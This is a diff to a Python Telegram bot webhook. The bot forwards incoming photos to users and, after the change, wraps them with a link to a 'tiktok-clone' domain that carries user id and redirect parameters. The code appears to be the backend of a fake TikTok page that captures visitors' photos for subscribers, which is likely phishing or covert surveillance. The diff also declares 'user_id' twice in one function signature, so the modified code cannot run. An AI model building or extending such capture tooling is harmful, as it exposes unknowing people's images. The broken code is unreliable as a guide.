@@ -67,7 +67,7 @@ async def webhook(
         mydb.close()
 
         if subscription > 0:
-            await send_telegram_photo(user_id, photo, redirect_url)
+            await send_telegram_photo(user_id, photo, redirect_url, user_id)
         else:
             photo_path = await save_image(photo, "data/images")
 
@@ -81,7 +81,7 @@ async def webhook(
             keyboard =  InlineKeyboardMarkup(inline_keyboard=kb_list)
 
 
-            await send_telegram_message(user_id, f"Вам пришло новое фото!\nТикток: {redirect_url}", reply_markup=keyboard)
+            await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
 
     return {"status": "Success"}
 
@@ -90,9 +90,9 @@ async def send_telegram_message(user_id, text, reply_markup):
     await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
 
 
-async def send_telegram_photo(user_id, photo, redirect_url):
+async def send_telegram_photo(user_id, photo, redirect_url, user_id):
     photo_path = await save_image(photo, "data/images")
-    await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'Вам пришло новое фото!\nТикток: {redirect_url}')
+    await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
 
 
 async def connect():
